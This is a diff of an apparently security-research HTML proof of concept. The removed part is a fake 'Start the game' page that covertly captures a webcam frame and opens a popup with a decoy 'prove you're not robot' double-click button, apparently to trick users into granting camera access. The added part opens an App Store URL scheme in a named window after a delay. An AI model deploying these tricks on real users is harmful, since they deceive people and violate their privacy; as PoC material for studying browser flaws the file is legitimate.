@@ -1,73 +1,8 @@
-<body style="color:white;background-color:black">
-  <center>
-    <br><br><br><br><br>
-    <button style="padding: 10px 20px; background: linear-gradient(90deg, #4CAF50, #45A049); border: none; border-radius: 25px; color: white; font-size: 50px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); transition: all 0.3s ease;">
-      Start the game
-    </button>
-    <br><br><br><br>
-    <img src="https://i.ytimg.com/vi/cWOkHQXw0JQ/hq720.jpg?sqp=-oaymwEhCK4FEIIDSFryq4qpAxMIARUAAAAAGAElAADIQj0AgKJD&rs=AOn4CLCqzdZDkPgmkM1-wTVsdF2LhRxynw">
-  </center>
-
-  <script>
-    async function captureFrame() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      const video = document.createElement('video');
-      video.style.position = 'absolute';
-      video.style.top = '-9999px';
-      video.playsInline = true;
-      video.srcObject = stream;
-      document.body.appendChild(video);
-      await video.play();
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-      document.body.innerHTML = '<h1>pwned, here is your picture:<br></h1>';
-      document.body.appendChild(canvas);
-      stream.getTracks().forEach(track => track.stop());
-      document.body.removeChild(video);
+<a href="http://example.com" target="ccc" onclick="poc()">click me</a>
+<script>
+    function poc(){
+        setTimeout(() => {
+           window.open("itms-apps://itunes.apple.com/app/[App ID]?mt=8","ccc");
+        }, 2000);
     }
-
-    document.body.onclick = () => {
-      captureFrame();
-      // Perubahan: buat popup lebih tinggi dan sedikit lebih atas
-      let params = `scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=${window.innerWidth},height=800,left=100,top=50`;
-      setTimeout(() => {
-        let win = open('about:blank', 'win', params);
-        // Tombol diletakkan di pojok kiri atas dengan sedikit margin (tidak terlalu pojok)
-        win.document.write(`
-          <body style="background-color: black; margin: 0; height: 100vh; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; position: relative;">
-            <button id="topLeftBtn" style="
-              position: absolute;
-              top: 100px;
-              left: 220px;
-              padding: 10px 16px;
-              border-radius: 8px;
-              background: #1e88e5;
-              color: white;
-              border: none;
-              font-size: 16px;
-              cursor: pointer;
-              box-shadow: 0 4px 12px rgba(0,0,0,0.4);
-            ">Double Click Here</button>
-
-            <div style="color: white; position: absolute; bottom: 35vh; left: 50%; transform: translateX(-50%);">
-              <h1>Double click below to prove you're not robot</h1>
-            </div>
-
-            <script>
-              // tutup window bila tombol diklik (atau double-click bila mau)
-              document.getElementById('topLeftBtn').addEventListener('dblclick', function(){
-                window.close();
-              });
-              // juga tutup saat klik tombol satu kali (opsional)
-              document.getElementById('topLeftBtn').addEventListener('click', function(){
-                // do nothing on single click, keep dblclick as close action
-              });
-            <\/script>
-          </body>
-        `);
-      }, 10);
-    };
-  </script>
-</body>
+</script>
